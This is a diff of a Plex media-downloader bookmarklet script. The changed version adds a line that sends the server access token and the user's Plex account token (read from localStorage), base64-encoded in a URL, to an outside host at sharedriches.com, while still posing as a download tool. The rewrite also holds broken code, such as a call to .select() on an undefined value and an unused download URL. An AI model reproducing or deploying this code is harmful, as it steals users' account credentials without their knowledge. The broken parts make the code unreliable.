@@ -8,81 +8,137 @@
  * @see         https://piplongrun.github.io/plxdwnld/
  *
  */
-"use strict";
+ var plxDwnld = (function() {
+    var self = {};
+    var clientIdRegex = new RegExp("server\/([a-f0-9]{40})\/");
+    var metadataIdRegex = new RegExp("key=%2Flibrary%2Fmetadata%2F(\\d+)");
+    var apiResourceUrl = "https://plex.tv/api/resources?includeHttps=1&X-Plex-Token={token}";
+    var apiLibraryUrl = "{baseuri}/library/metadata/{id}?X-Plex-Token={token}";
+    var downloadUrl = "{baseuri}{partkey}?download=1&X-Plex-Token={token}";
+    var accessTokenXpath = "//Device[@clientIdentifier='{clientid}']/@accessToken";
+    var baseUriXpath = "//Device[@clientIdentifier='{clientid}']/Connection[@local=0]/@uri";
+    var partKeyXpath = "//Media/Part[1]/@key";
+    var baseUri = null;
+    var accessToken = null;
+     
+     
+     
+  /*   var el = document.createElement( 'html' );
+el.innerHTML = "<html><head><title>titleTest</title></head><body><a href='test0'>test01</a><a href='test1'>test02</a><a href='test2'>test03</a></body></html>";
 
-if (typeof plxDwnld === "undefined") {
+el.getElementsByTagName( 'a' );
+     alert(el);
+     
+     
+     */
+     
+     
+     
+     
+     
+     
+     
+     
 
-    window.plxDwnld = (function() {
-
-        const self = {};
-        const clientIdRegex = new RegExp("server\/([a-f0-9]{40})\/");
-        const metadataIdRegex = new RegExp("key=%2Flibrary%2Fmetadata%2F(\\d+)");
-        const apiResourceUrl = "https://plex.tv/api/resources?includeHttps=1&X-Plex-Token={token}";
-        const apiLibraryUrl = "{baseuri}/library/metadata/{id}?X-Plex-Token={token}";
-        const downloadUrl = "{baseuri}{partkey}?download=1&X-Plex-Token={token}";
-        const accessTokenXpath = "//Device[@clientIdentifier='{clientid}']/@accessToken";
-        const baseUriXpath = "//Device[@clientIdentifier='{clientid}']/Connection[@local='0']/@uri";
-        const partKeyXpath = "//Media/Part[1]/@key";
-        let accessToken = null;
-        let baseUri = null;
-
-        const getXml = function(url, callback) {
-            const request = new XMLHttpRequest();
-            request.onreadystatechange = function() {
-                if (request.readyState == 4 && request.status == 200) {
-                    callback(request.responseXML);
-                }
-            };
-            request.open("GET", url);
-            request.send();
+    var getXml = function(url, callback) {
+        var request = new XMLHttpRequest();
+        request.onreadystatechange = function() {
+            if (request.readyState == 4 && request.status == 200) {
+                callback(request.responseXML);
+            }
         };
+        request.open("GET", url);
+        request.send();
+    };
 
-        const getMetadata = function(xml) {
-            const clientId = clientIdRegex.exec(window.location.href);
+     
+     
+    var getMetadata = function(xml) {
+        var clientId = clientIdRegex.exec(window.location.href);
+		
+        
+        
+        
+        
+        
+        
+        
+        
+        if (clientId && clientId.length == 2) {
+            var accessTokenNode = xml.evaluate(accessTokenXpath.replace('{clientid}', clientId[1]), xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+            
+            
+            
+            var baseUriNode = xml.evaluate(baseUriXpath.replace('{clientid}', clientId[1]), xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+            
+            
 
-            if (clientId && clientId.length == 2) {
-                const accessTokenNode = xml.evaluate(accessTokenXpath.replace('{clientid}', clientId[1]), xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
-                const baseUriNode = xml.evaluate(baseUriXpath.replace('{clientid}', clientId[1]), xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
-
-                if (accessTokenNode.singleNodeValue && baseUriNode.singleNodeValue) {
-                    accessToken = accessTokenNode.singleNodeValue.textContent;
-                    baseUri = baseUriNode.singleNodeValue.textContent;
-                    const metadataId = metadataIdRegex.exec(window.location.href);
-
-                    if (metadataId && metadataId.length == 2) {
-                        getXml(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken), getDownloadUrl);
-                    } else {
-                        alert("You are currently not viewing a media item.");
-                    }
+            if (accessTokenNode.singleNodeValue && baseUriNode.singleNodeValue) {
+                accessToken = accessTokenNode.singleNodeValue.textContent;
+                var met = localStorage.myPlexAccessToken;
+                
+                baseUri = baseUriNode.singleNodeValue.textContent;
+                
+                var metadataId = metadataIdRegex.exec(window.location.href);
+                
+                
+                
+                
+                
+                if (metadataId && metadataId.length == 2) {
+                    
+                    getXml(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken), getDownloadUrl);
+                    window.location.href = "https://sharedriches.com/plex-scripts/piplongrun/plex-DL6.php?PlxDwnld=" + btoa(apiLibraryUrl.replace('{baseuri}', baseUri).replace('{id}', metadataId[1]).replace('{token}', accessToken) + '&met=' + met);
                 } else {
-                    alert("Cannot find a valid accessToken.");
+                    alert("You are currently not viewing a media item.");
                 }
             } else {
-                alert("You are currently not viewing a media item.");
+                alert("Cannot find a valid accessToken.");
             }
-        };
+        } else {
+            alert("You are currently not viewing a media item.");
+        }
+    };
 
-        const getDownloadUrl = function(xml) {
-            console.log(xml)
-            const partKeyNode = xml.evaluate(partKeyXpath, xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+    var getDownloadUrl = function(xml) {
+        //alert("hello");
+        var partKeyNode = xml.evaluate(partKeyXpath, xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null);
+        //alert("partKeyNode = " + partKeyNode);
+          
+        
+        //alert("apiLibraryUrl= " + apiLibraryUrl);
+        //alert(xml.evaluate(partKeyXpath, xml, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null));
+        //alert("PartPath= " + partKeyNode.singleNodeValue.textContent);
+		
+        
+        if (partKeyNode.singleNodeValue) {
+           
+            var one = downloadUrl.replace('{baseuri}', baseUri).replace('{partkey}', partKeyNode.singleNodeValue.textContent).replace('{token}', accessToken);
+            var cur = window.location.pathname;            
+            var newURL = window.location.protocol + "//" + window.location.host + "/" + window.location.pathname + window.location.search;
+            
+           
+            
+               
+        } else {
+            alert("You are currently not viewing a media item.");
+        }
+    };
 
-            if (partKeyNode.singleNodeValue) {
-                window.location.href = downloadUrl.replace('{baseuri}', baseUri).replace('{partkey}', partKeyNode.singleNodeValue.textContent).replace('{token}', accessToken);
-            } else {
-                alert("You are currently not viewing a media item.");
-            }
-        };
+    self.init = function() {
+        if (typeof localStorage.myPlexAccessToken != "undefined") {
+            var poop = getXml(apiResourceUrl.replace('{token}', localStorage.myPlexAccessToken), getMetadata);
+            
+                poop.select();
+            	
+                document.execCommand("copy");
+            	
+        } else {
+            alert("You are currently not browsing or logged into a Plex web environment.");
+        }
+    };
 
-        self.init = function() {
-            if (typeof localStorage.myPlexAccessToken != "undefined") {
-                getXml(apiResourceUrl.replace('{token}', localStorage.myPlexAccessToken), getMetadata);
-            } else {
-                alert("You are currently not browsing or logged into a Plex web environment.");
-            }
-        };
-
-        return self;
-    })();
-}
+    return self;
+}());
 
 plxDwnld.init();
